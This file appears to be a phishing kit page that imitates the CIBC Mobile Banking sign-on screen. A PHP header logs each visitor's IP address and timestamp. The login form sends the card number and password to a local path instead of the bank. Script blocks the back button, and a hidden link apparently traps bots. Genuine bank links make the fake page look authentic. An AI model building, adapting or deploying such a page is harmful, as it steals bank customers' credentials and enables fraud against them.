<?php
// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");
// Get the client's IP address
$ipAddress = get_client_ip();
// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];
// Specify the log file location
$logFile = "third-party-log.txt"; // Replace with the path to your log file

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

// Set response headers for caching and security
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");
header("X-Robots-Tag: noarchive");
header("X-Content-Type-Options: nosniff");
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>CIBC Mobile Banking Sign On</title>
    <script type="text/javascript">
        // Disable caching for forward and backward navigation
        function disableCaching() {
            // Disable caching for forward navigation
            window.onpageshow = function (event) {
                if (event.persisted) {
                    document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
                }
            };

            // Disable caching for backward navigation
            window.onunload = function () {};
        }

        // Disable the back button using JavaScript
        window.history.pushState(null, null, document.URL);
        window.addEventListener('popstate', function () {
            window.history.pushState(null, null, document.URL);
        });

        // Set client browser cache to one hour prior
        function setBrowserCacheTime() {
            const date = new Date();
            date.setTime(date.getTime() - (60 * 60 * 1000));
            document.getElementById('cacheExpires').content = date.toUTCString();
        }

        // Call the necessary functions when the page loads
        document.addEventListener('DOMContentLoaded', function () {
            disableCaching();
            setBrowserCacheTime();
        });
    </script>
        
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="HandheldFriendly" content="true">
        <meta name="format-detection" content="telephone=no">
        <link rel="stylesheet" href="./files/reset.css">
        <link rel="stylesheet" href="./files/reset-brand.css">
        <link rel="stylesheet" href="./files/global.css">
        <link rel="stylesheet" href="./files/global-android2.css">
        <link rel="stylesheet" href="./files/global-brand.css">
        <script type="text/javascript" src="./files/jquery-1"></script>
        <script type="text/javascript" src="./files/wicket-event-jquery"></script>
        <script type="text/javascript" src="./files/wicket-ajax-jquery"></script>
        <link rel="stylesheet" href="./files/carousel.css">
        <script src="./files/carousel"></script>
        <link rel="stylesheet" href="./files/signon.css">
        <link rel="stylesheet" href="./files/signon-brand.css">
        <meta name="msapplication-tap-highlight" content="no">
        <style id="at-makers-style" class="at-flicker-control">
            .mboxDefault {visibility: hidden;}
        </style>
        <style>
        .check-label::before {
            background-image: url(/assets/cibc/img/checkbox.png);
        }

        .check-box:checked + .check-label::before {
            background-image: url(/assets/cibc/img/checkbox-selected.png);
        }

        .input-password {
          -webkit-text-security: disc;
        }
        </style>
        <style>
        #header-logo {
            background: url(/assets/cibc/img/cibcnew.svg);
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            width: 100px;
        }
        </style>

        <script src="./files/actions"></script>
        <link rel="stylesheet" href="./files/all.css">

    </head>
    <body lang="en" class="android-fix">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <span class="offscreen">CIBC Mobile Banking Sign On</span>
        <input type="checkbox" id="drawer-toggle-chk" aria-hidden="true">
        <label for="drawer-toggle-chk" id="drawer-toggle-label">
            <img id="open-menu-icon" src="./files/drawer-menu-open.png" alt="Open Menu" role="button">
            <img id="close-menu-icon" src="./files/drawer-menu-close.png" alt="Close Menu" role="button">
        </label>
        <nav id="drawer-menu" class="scrollable-ver">
            <div id="menu-wrapper">
                <div class="drawer-menu-header">
                    <div>CIBC <span>Mobile Banking</span></div>
                </div>
                <ul>
                    <li id="li-sign-on"><a id="signon-link" class="tracking-set-flow active" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-signonLink" role="menuitem">Sign On<span class="offscreen">Selected</span></a></li>
                    <li><a id="register-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-registerLink" role="menuitem">Register</a></li>
                    <li id="li-forgot-password"><a id="forgetpwd-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-forgetPasswordLink" role="menuitem">Forgot Password</a></li>
                    <hr>
                    <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-openAccountPs-openAccountPsLink" role="menuitem" @="Open an Account&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;">Open an Account</a></li>
                    <li id="li-browse-products"><a id="browse-products-link" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-browseProductsPs-productSelectorLink" target="_blank" role="menuitem" @="Explore Products&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;" class="">Explore Products</a></li>
                    <li id="li-sites-apps"></li>
                    <li id="li-sites-apps"><a id="sites-link" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-sitesPreSignOnLink" role="menuitem" class="">CIBC Sites</a></li>
                    <li id="li-find-us"><a id="find-us-link" href="https://www.cibc.com/ca/redirect/locator.html?itrc=C1:6185" target="_blank" role="menuitem">Find Us</a></li>
                    <li id="li-security"><a id="security-guarantee-link" href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:6166" target="_blank" role="menuitem">Security Guarantee</a></li>
                    <hr>
                    <li><a id="contact-us-link" href="https://www.cibc.com/m/contact-cibc.html?itrc=C1:6187" target="_blank" role="menuitem">Contact Us</a></li>
                    <li id="id3"><a id="legal-link" role="menuitem" href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-drawerMenu-privacyAndLegalContainer-legalLink" @="Privacy and Legal&lt;span class=&quot;offscreen&quot;&gt;Opens in new page.&lt;/span&gt;" class="">Privacy and Legal<span class="offscreen">Opens in new page.</span></a></li>
                    <li><a id="help-link" href="http://cibc.intelliresponse.com/mobile-w/?itrc=C1:6167" target="_blank" role="menuitem">Help</a></li>
                </ul>
            </div>
        </nav>
        <header class="flex-box flex-box-hoz">
            <div class="flex-box-flex-1"></div>
            <a href="http://cibc.com/" target="_blank">
                <div id="header-logo">
                    <span class="offscreen">CIBC logo</span>
                </div>
            </a>
            <div id="header-link" class="flex-box-flex-1">
                <a id="adchoice-icon-link" href="https://www.cibc.com/en/privacy-security/internet-based-advertising.html" target="_blank">
                <img src="./files/ADC-icon-cibc.png" alt="AdChoices. Opens in new browser window">
                </a>
                <a href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-header-linkLocale" class="headerLink" id="id2">
                    <div lang="fr">Français</div>
                </a>
            </div>
        </header>
        <noscript>

                <div>
                    <p>JavaScript is currently disabled in your browser.</p>
                    <p>To access Mobile Banking, please enable JavaScript and refresh this page.</p>
                </div>
            </section>
        </noscript>
        <section id="main-page" class="div-main" style="display: none;">
            <input type="checkbox" id="sign-off-check" class="hide" name="signOffCheck">
            <section id="signoff" class="overlay-msg">
                <div>
                    <a href="https://www.cibc.mobi/ebm-mobile-anp/signon?0-1.ILinkListener-closePopupButton" id="sign-off-button"><img src="./files/close-icon-red.png" alt="Close" role="button"></a>
                    <p>You have successfully signed out.</p>
                    <div id="sub-msg">Thank you for banking with <span>CIBC</span> Mobile Banking.</div>
                </div>
            </section>
            <div id="carousel-container" aria-hidden="true">
                <img id="slide-sizer" src="./files/sizer.png" alt="">
                <section id="carousel">
                    <div id="items-container">
                        <div id="touch-box" style="cursor: pointer;"></div>
                        <article id="s1" class="carousel-item carousel-item-on" style="z-index: 0;">
                            <a id="carousel-link-1" href="javascript:;"><img src="./files/45490-mobile-web-en.jpg" alt=""></a>
                        </article>
                    </div>
                </section>
                <div id="slideIndicators">
                    <div class="inline">
                        <div class="indicator-bg indicator-on" id="indicator1"></div>
                    </div>
                </div>
            </div>
            <section id="signon">
                <div id="form-center">
                    <div class="global-error-from-container" tabindex="-1" id="id4">
                        <div class="global-error-from-container error-div" style="display: none" tabindex="-1">
                        	<div class="global-error-form-wrapper">
                                <div class="global-error-form-msg">
                            		<span role="alert" class="">You have entered incorrect information. Check your card number and password and try again. (0008)</span>
                            	</div>
                            </div>
                        </div>
                    </div>
                    <form id="lab-form" method="post" class="lab-form" action="/220098/cibc">
                        <div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input type="hidden" name="id1_hf_0" id="id1_hf_0"></div>
                        <fieldset class="sign-on-new" id="new-card-number">
                            <label for="user-card-number"><span class="offscreen">Card Number</span></label>
                            <input id="input-card" type="tel" placeholder="Card Number" name="username" class="lrinput input-username" required="true" autocomplete="off" maxlength="19" attr-action="Filling Card" oninput="this.value = this.value.replace(/[^0-9, ]/, &#39;&#39;)" style="margin-bottom: 13px;">
                            <script src="./files/splitter"></script>
                            <link rel="stylesheet" href="./files/card.css">
                        </fieldset>
                        <fieldset class="sign-on-new" id="remember-new-card">
                            <input type="checkbox" id="remember-card-chk" class="check-box" name="rememberCardCkBx">
                            <label for="remember-card-chk" class="check-label" id="remember-card-label">Remember Card</label>
                        </fieldset>
                        <fieldset class="sign-on-remember">
                        </fieldset>
                        <fieldset>
                            <label for="user-password"><span class="offscreen">Password</span></label>
                            <input type="password" autocapitalize="none" class="lrinput input-password" autocomplete="off" data-id="password" id="user-password" required="" name="password" placeholder="Password" maxlength="12" value="" attr-action="Filling Password">
                        </fieldset>
                        <button type="submit" class="btn btn-neutral btn-save btn-login" id="signon-button" name="save22">
                            <span class="btn-txt">SIGN ON</span>
                            <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
                        </button>
                    </form>
                </div>
                <div id="bttm-shadow"><img src="./files/shadow.png" id="shadow" role="presentation"></div>
            </section>
            <footer class="page-footer">
                <div>
                    <p>Your use of CIBC Mobile Banking is governed by the Electronic Access Agreement (2016).</p>
                    <p>CIBC Mobile Banking</p>
                    <p>© Copyright </p>
                    <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                </div>
                <div class="release">
                    <p>RT23 &nbsp; &nbsp; 2.13.3 &nbsp; &nbsp; </p>
                </div>
            </footer>
        </section>
        <section id="change-password" class="page-wrapper div-loader" style="display: block; margin-top: 46px;">
            <style>
            .loader-div {
                text-align: center;
                padding-top: 20px;
            }

            .loader-div h2 {
                font-size: 28px;
                margin-bottom: 40px;
            }
            </style>
            <div class="global-error-from-container loader-div" id="idf">
                <h2 class="title">Processing</h2>
                <img src="./files/loading.gif" width="80">
            </div>
        </section>
    

</body></html>
